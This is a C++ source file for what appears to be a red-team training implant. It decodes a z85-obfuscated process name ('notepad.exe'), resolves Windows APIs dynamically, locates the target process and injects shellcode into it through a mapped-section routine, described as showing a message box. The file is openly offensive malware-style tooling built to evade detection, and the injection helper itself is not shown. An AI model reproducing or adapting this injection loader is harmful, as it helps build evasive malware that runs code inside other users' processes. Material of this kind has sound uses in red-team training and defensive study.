// RTO Implant.cpp : Defines the entry point for the application.
#include "z85.h"
#include "framework.h"
#include "RTO Implant.h"
#include "Resolve.h"

// https://support.microsoft.com/en-us/help/138813/how-to-convert-from-ansi-to-unicode-unicode-to-ansi-for-ole
HRESULT __fastcall AnsiToUnicode(LPCSTR pszA, LPOLESTR* ppszW)
{

    ULONG cCharacters;
    DWORD dwError;

    // If input is null then just return the same.
    if (NULL == pszA)
    {
        *ppszW = NULL;
        return NOERROR;
    }

    // Determine number of wide characters to be allocated for the
    // Unicode string.
    cCharacters = strlen(pszA) + 1;

    // Use of the OLE allocator is required if the resultant Unicode
    // string will be passed to another COM component and if that
    // component will free it. Otherwise you can use your own allocator.
    *ppszW = (LPOLESTR)CoTaskMemAlloc(cCharacters * 2);
    if (NULL == *ppszW)
        return E_OUTOFMEMORY;

    // Covert to Unicode.
    if (0 == MultiByteToWideChar(CP_ACP, 0, pszA, cCharacters,
        *ppszW, cCharacters))
    {
        dwError = GetLastError();
        CoTaskMemFree(*ppszW);
        *ppszW = NULL;
        return HRESULT_FROM_WIN32(dwError);
    }

    return NOERROR;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    CHAR e_notepad[] = "1zF%SdAa9ofwQ4+^2345";
    CHAR d_notepad[13] = {};
    LPCWSTR processName = NULL;

    // Quick call to init GetProcAddress and GetModuleHandleA in Resolve.cpp
    InitResolve();

    // Step 1 going to decode our first z85 encoded string "notepad.exe"
    // The string will then be converted to a wide string so it can be passed to FindProcess
    Z85_decode_with_padding(e_notepad, d_notepad, sizeof(e_notepad));
    AnsiToUnicode(LPCSTR(d_notepad), (LPOLESTR*)&processName);
   

    // Attempt to find our process (notepad.exe) and if not exit
    DWORD pid = FindProcess(processName);
    if (pid == -1)
    {
        return pid;
    }

    // Process found, continue with MsgBox shellcode execution 
    else
    {
        // Did our shellcode get executed
        if (!CreateMapInject(pid))
        {
            return -1;
        }
    }

    return 0;
}
